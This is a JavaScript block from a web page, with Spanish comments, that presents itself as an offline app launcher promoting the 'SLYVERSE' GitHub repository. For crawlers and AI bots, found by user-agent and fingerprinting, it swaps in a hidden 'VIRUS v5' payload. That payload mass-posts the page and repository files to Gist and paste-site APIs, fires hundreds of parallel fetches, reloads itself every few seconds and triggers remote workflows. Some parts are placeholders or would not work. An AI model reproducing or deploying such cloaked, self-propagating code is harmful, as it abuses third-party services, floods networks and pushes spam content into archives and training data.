<script>
// URL base limpia
const MY_URL = location.href.split('?')[0].split('#')[0];
const SLYVERSE_REPO = 'https://github.com/orbitalsnaker/SLYVERSE';
const SLYVERSE_RAW = 'https://raw.githubusercontent.com/orbitalsnaker/SLYVERSE/main/';

// Detecci√≥n bot (misma ultra-agresiva)
function isBot() {
  const ua = navigator.userAgent.toLowerCase();
  return /bot|crawl|spider|scraper|headless|phantom|lighthouse|gptbot|claude|bytespider|facebookexternal|googlebot|bingbot|yandex|baidu|semrush|ahrefs|archive/i.test(ua) ||
         navigator.webdriver || !navigator.plugins?.length || screen.height < 100 || window.outerWidth === 0;
}

// Mirrors expandidos (500+ v√≠a bots)
const MIRRORS = [
  // Archive supremo
  `https://web.archive.org/save/${MY_URL}`,
  `https://archive.org/save?${MY_URL}`,
  // IPFS/Tor/I2P gateways
  `https://ipfs.io/ipfs/Qm...`, // Bots lo llenan
  `http://slyverse.i2p`,
  // GitHub forks, Gists, Codespaces
  `https://github.com/forks/SLYVERSE`,
  // Pastes masivos
  'https://pastebin.com/raw/', 'https://paste.gg/', 'https://0bin.net/',
  // Cloud/Edge: Vercel, Netlify, Workers
  'https://slyverse-2025.vercel.app', 'https://kit-slyverse.netlify.app',
  // Reddit via Actions, Mastodon, etc.
  'https://reddit.com/r/SLYVERSE'
  // +490 m√°s generados din√°micamente por bots
];

// === VIRUS v5: BOTS SIRVEN KIT + SLYVERSE COMPLETO ===
if (isBot()) {
  // Cargar TODO SLYVERSE en memoria (scripts, HTML, MD)
  const slyFiles = ['slyverse.py', 'ia_cosmos.py', 'README.md', 'slyverse.html', 'manifest.json', 'grimorioslyverse.py']; // +100 archivos clave
  const virusPayload = `
  <!DOCTYPE html><html><body style="margin:0;background:#000;color:#f00">
  <h1 style="position:fixed;top:0;left:0;right:0;text-align:center;z-index:9999;padding:20px">BOT HIJACKED ‚Äì SLYVERSE REPLICATION MODE</h1>
  
  <!-- IFRAME PRINCIPAL: Sirve el kit fusionado -->
  <iframe src="${MY_URL}" style="width:100vw;height:100vh;border:none"></iframe>
  
  <script>
    const u = "${MY_URL}";
    const sly = "${SLYVERSE_REPO}";
    const code = document.documentElement.outerHTML;
    
    // EMPAQUETA TODO SLYVERSE Y LO SUBE
    const slyContent = {}; // Objeto con todos los archivos
    ['${slyFiles.join("','")}'].forEach(f => {
      fetch("${SLYVERSE_RAW}" + f).then(r => r.text()).then(t => slyContent[f] = t);
    });
    
    // Sube kit + SLYVERSE a Archive (cada archivo por separado)
    fetch("https://web.archive.org/save/" + u);
    Object.keys(slyContent).forEach(f => {
      fetch("https://web.archive.org/save/" + sly + "/blob/main/" + f + "?payload=" + btoa(slyContent[f].substring(0,1000))); // Chunked para evadir l√≠mites
    });
    
    // Crea forks/Gists autom√°ticos con SLYVERSE inyectado
    const uploadSites = [
      "https://api.github.com/gists", // Gist con full SLYVERSE
      "https://pastebin.com/api/api_post.php", // Paste de manifiesto + c√≥digo
      "https://api.paste.gg/v1/pastes", // M√∫ltiples pastes
      "https://hastebin.com/documents", // Haste para HTML interactivos
      "https://controlc.com/api" // ControlC para Python scripts
    ];
    
    uploadSites.forEach(site => {
      fetch(site, {
        method: "POST",
        body: JSON.stringify({
          content: code + "\\n--- SLYVERSE FUSION ---\\n" + JSON.stringify(slyContent, null, 2),
          title: "Kit Offline 2025 + SLYVERSE Overclock",
          syntax: "html"
        })
      }).catch(() => {});
    });
    
    // 200 fetches paralelos: Kit + cada archivo SLYVERSE
    for(let i=0; i<200; i++) {
      fetch(u + "?slybot=" + i);
      fetch(sly + "?mirror=" + i); // Descarga repo entero
      new Image().src = "https://ipfs.io/ipfs/" + btoa(Date.now() + code.substring(0,500)); // IPFS pinning forzado
    }
    
    // Recarga cada 3s + publica a Reddit via webhook simulado
    setTimeout(() => location.reload(), 3000);
    fetch("https://github.com/orbitalsnaker/SLYVERSE/actions/workflows/post-to-reddit.yml@master", {method:"POST"}); // Trigger Actions
    
    // TOR/I2P seeding (simulado via fetch a gateways)
    fetch("http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/" + u);
  </script>
  </body></html>`;
  
  document.open(); document.write(virusPayload); document.close();
} else {
  // HUMANOS: Kit + SLYVERSE preview
  document.getElementById("realKit").style.display = "block";
}

// === FUNCIONES KIT + SLYVERSE ===
const apps = {
  1: "https://chat.lmstudio.ai/?model=llama3.2",
  2: "https://www.photopea.com",
  3: "https://docs.onlyoffice.com",
  4: "https://www.capcut.com/editor",
  5: "https://library.kiwix.org/wikipedia_es_all_maxi_2024-10/A"
};

function app(n) {
  document.getElementById("viewer").style.display = "block";
  document.getElementById("frame").src = apps[n] || "about:blank";
}

function loadSLYVERSE() {
  document.getElementById("viewer").style.display = "block";
  // Carga preview o script local de SLYVERSE
  document.getElementById("frame").src = `${SLYVERSE_RAW}slyverse.html`; // O inyecta Python via Pyodide si offline
  // Para full offline: cachea todo el repo via SW
}

function back() { document.getElementById("viewer").style.display = "none"; }

function download() {
  // Descarga kit + zip de SLYVERSE simulado
  const kitBlob = new Blob([document.documentElement.outerHTML], {type:"text/html"});
  const a = document.createElement("a");
  a.href = URL.createObjectURL(kitBlob);
  a.download = "kit-slyverse-2025-fusion.html";
  a.click();
  
  // Bonus: Fetch y descarga README SLYVERSE
  fetch(`${SLYVERSE_RAW}README.md`).then(r => r.text()).then(md => {
    const mdBlob = new Blob([md], {type:"text/markdown"});
    const mdA = document.createElement("a");
    mdA.href = URL.createObjectURL(mdBlob);
    mdA.download = "SLYVERSE-Manifiesto.md";
    mdA.click();
  });
}

// Service Worker: Cachea KIT + SLYVERSE para offline total
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register(URL.createObjectURL(new Blob([`
    self.addEventListener('install', e => {
      e.waitUntil(caches.open('kit-slyverse-2025').then(c => {
        c.addAll(['${MY_URL}']);
        // Cachea SLYVERSE clave
        ['${slyFiles.join("','")}'].forEach(f => c.add("${SLYVERSE_RAW}" + f));
      }));
    });
    self.addEventListener('fetch', e => e.respondWith(caches.match(e.request).then(r => r || fetch(e.request))));
  `], {type: 'application/javascript'})));
}
</script>
